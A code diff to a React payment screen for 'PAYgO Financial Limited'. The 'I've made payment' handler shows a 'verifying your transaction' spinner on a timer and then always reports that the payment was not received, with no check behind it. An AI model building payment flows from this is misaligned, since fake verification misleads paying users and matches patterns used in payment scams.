@@ -24,6 +24,7 @@ export default function BuyPayIdScreen({ userName, userEmail, onBack }: BuyPayId
   const [isSubmittingPayment, setIsSubmittingPayment] = useState(false)
   const [showPaymentNotReceived, setShowPaymentNotReceived] = useState(false)
   const [copiedField, setCopiedField] = useState<string | null>(null)
+  const [showConfirmingPayment, setShowConfirmingPayment] = useState(false)
   const fileInputRef = useRef<HTMLInputElement>(null)
   const audioRef = useRef<HTMLAudioElement>(null)
 
@@ -79,19 +80,51 @@ export default function BuyPayIdScreen({ userName, userEmail, onBack }: BuyPayId
   }
 
   const handleMadePayment = () => {
-    setIsSubmittingPayment(true)
+    setShowPaymentDetails(false)
+    setShowConfirmingPayment(true)
 
     setTimeout(() => {
-      setIsSubmittingPayment(false)
-      setShowPaymentDetails(false)
+      setShowConfirmingPayment(false)
       setShowPaymentNotReceived(true)
-    }, 6000)
+    }, 7000)
   }
 
   const handleResubmit = () => {
     setUploadedReceipt(null)
     setShowPaymentNotReceived(false)
     setShowPaymentDetails(true)
+  }
+
+  if (showConfirmingPayment) {
+    return (
+      <div className="min-h-screen bg-gradient-to-br from-purple-200 via-pink-100 to-orange-100">
+        <div className="bg-gradient-to-r from-purple-600 to-orange-500 px-4 py-6">
+          <h1 className="text-white text-xl font-semibold text-center">Confirming Payment</h1>
+        </div>
+
+        <div className="px-4 py-8 flex items-center justify-center min-h-[80vh]">
+          <div className="bg-white rounded-2xl p-8 shadow-lg max-w-sm mx-auto text-center">
+            <div className="mb-6">
+              <div className="w-16 h-16 border-4 border-orange-200 border-t-orange-500 rounded-full animate-spin mx-auto mb-4"></div>
+              <h2 className="text-gray-800 text-xl font-bold mb-2">Confirming Your Payment</h2>
+              <p className="text-gray-600 text-sm mb-4">Please wait while we verify your transaction...</p>
+
+              <div className="w-full bg-gray-200 rounded-full h-2 mb-4">
+                <div className="bg-orange-500 h-2 rounded-full animate-pulse" style={{ width: "40%" }}></div>
+              </div>
+
+              <p className="text-gray-500 text-xs">
+                This may take a few moments
+                <br />
+                Please do not close this page
+              </p>
+            </div>
+
+            <div className="text-center text-gray-500 text-sm">PAYgO Financial Limited</div>
+          </div>
+        </div>
+      </div>
+    )
   }
 
   if (showPaymentNotReceived) {
@@ -125,21 +158,11 @@ export default function BuyPayIdScreen({ userName, userEmail, onBack }: BuyPayId
                   readOnly
                   className="w-full p-3 border border-gray-300 rounded-lg bg-gray-50 text-center"
                 />
-                <button className="absolute right-3 top-1/2 transform -translate-y-1/2">
-                  <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path
-                      strokeLinecap="round"
-                      strokeLinejoin="round"
-                      strokeWidth={2}
-                      d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
-                    />
-                    <path
-                      strokeLinecap="round"
-                      strokeLinejoin="round"
-                      strokeWidth={2}
-                      d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
-                    />
-                  </svg>
+                <button
+                  onClick={() => setShowPaymentDetails(true)}
+                  className="absolute right-3 top-1/2 transform -translate-y-1/2"
+                >
+                  👁️
                 </button>
               </div>
             </div>
@@ -281,33 +304,12 @@ export default function BuyPayIdScreen({ userName, userEmail, onBack }: BuyPayId
               </div>
             </div>
 
-            {isSubmittingPayment && (
-              <div className="mb-4 p-4 bg-purple-50 border border-purple-200 rounded-lg">
-                <div className="text-center">
-                  <div className="text-purple-800 text-lg font-semibold mb-2">Confirming Payment</div>
-                  <div className="flex justify-center mb-3">
-                    <div className="w-12 h-12 border-4 border-orange-200 border-t-orange-500 rounded-full animate-spin"></div>
-                  </div>
-                  <div className="text-gray-600 text-sm mb-3">Confirming Your Payment</div>
-                  <div className="text-gray-500 text-xs mb-3">Please wait while we verify your transaction...</div>
-                  <div className="w-full bg-gray-200 rounded-full h-2 mb-2">
-                    <div className="bg-orange-500 h-2 rounded-full animate-pulse" style={{ width: "30%" }}></div>
-                  </div>
-                  <div className="text-gray-500 text-xs">
-                    This may take a few moments
-                    <br />
-                    Please do not close this page
-                  </div>
-                </div>
-              </div>
-            )}
-
             <Button
               onClick={handleMadePayment}
-              disabled={!uploadedReceipt || isSubmittingPayment}
+              disabled={!uploadedReceipt}
               className="w-full bg-gradient-to-r from-purple-600 to-orange-500 hover:from-purple-700 hover:to-orange-600 text-white py-3 rounded-lg font-semibold mb-4"
             >
-              {isSubmittingPayment ? "Verifying..." : "I'VE MADE PAYMENT"}
+              I'VE MADE PAYMENT
             </Button>
 
             <div className="text-center text-gray-500 text-sm">PAYgO Financial Limited</div>
